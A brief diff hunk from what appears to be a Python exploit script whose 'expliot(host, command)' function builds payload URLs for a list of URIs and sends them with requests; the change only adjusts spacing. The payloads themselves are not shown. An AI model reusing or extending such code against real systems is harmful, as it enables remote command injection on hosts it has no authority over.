@@ -25,8 +25,8 @@ def expliot(host , command):
 
 	for _uri in link_list:
 		try:
-			payload_url = gen_paylaod(_uri, payload)
-			payload_url1 = gen_paylaod(_uri, payload1)
+			payload_url = gen_paylaod(_uri , payload)
+			payload_url1 = gen_paylaod(_uri , payload1)
 
 			res = requests.get(payload_url, allow_redirects=False)
 			res1 = requests.get(payload_url1, allow_redirects=False)
